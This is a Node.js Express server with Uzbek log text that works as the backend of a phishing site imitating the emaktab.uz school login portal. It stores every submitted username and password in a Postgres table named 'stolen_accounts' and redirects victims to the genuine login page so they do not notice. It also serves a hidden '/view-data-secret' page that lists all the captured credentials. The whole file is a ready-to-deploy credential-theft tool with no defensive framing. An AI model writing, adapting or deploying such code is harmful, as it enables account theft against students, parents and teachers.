require("dotenv").config();
const express = require("express");
const { Pool } = require("pg");
const path = require("path");
const app = express();

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false,
  },
});

const initDB = async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS stolen_accounts (
        id SERIAL PRIMARY KEY,
        login TEXT NOT NULL,
        password TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    console.log("Ma'lumotlar bazasi va jadval tayyor!");
  } catch (err) {
    console.error("Jadval yaratishda xatolik:", err);
  }
};
initDB();

app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

app.post("/auth/login", async (req, res) => {
  const { login, password } = req.body;

  try {
    await pool.query(
      "INSERT INTO stolen_accounts (login, password) VALUES ($1, $2)",
      [login, password],
    );

    console.log(`Baza yangilandi: ${login} saqlandi!`);
    res.redirect("https://login.emaktab.uz");
  } catch (err) {
    console.error("Xatolik yuz berdi:", err);
    res.redirect("https://login.emaktab.uz");
  }
});
app.get("/view-data-secret", async (req, res) => {
  try {
    const result = await pool.query(
      "SELECT * FROM stolen_accounts ORDER BY created_at DESC",
    );

    let html = `
    <!DOCTYPE html>
    <html lang="uz">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Panel | Ma'lumotlar</title>
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; margin: 0; padding: 20px; color: #333; }
            .container { max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
            h1 { color: #2c3e50; text-align: center; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; overflow: hidden; border-radius: 8px; }
            th { background-color: #3498db; color: white; padding: 12px; text-align: left; }
            td { padding: 12px; border-bottom: 1px solid #eee; }
            tr:hover { background-color: #f1f1f1; transition: 0.3s; }
            .status { padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; background: #e8f5e9; color: #2e7d32; }
            .time { color: #7f8c8d; font-size: 13px; }
            @media (max-width: 600px) { 
                table { font-size: 14px; } 
                .container { padding: 10px; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📊 Yig'ilgan ma'lumotlar boshqaruvi</h1>
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Login (Username)</th>
                        <th>Parol (Password)</th>
                        <th>Tushgan vaqti</th>
                    </tr>
                </thead>
                <tbody>`;

    result.rows.forEach((row) => {
      // Vaqtni chiroyli ko'rinishga keltirish
      const date = new Date(row.created_at).toLocaleString("uz-UZ");

      html += `
                <tr>
                    <td><strong>#${row.id}</strong></td>
                    <td><span class="status">${row.login}</span></td>
                    <td><code>${row.password}</code></td>
                    <td class="time">${date}</td>
                </tr>`;
    });

    html += `
                </tbody>
            </table>
        </div>
    </body>
    </html>`;

    res.send(html);
  } catch (err) {
    res.status(500).send("Bazadan ma'lumot olishda xato yuz berdi.");
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server ${PORT}-portda ishga tushdi`);
});
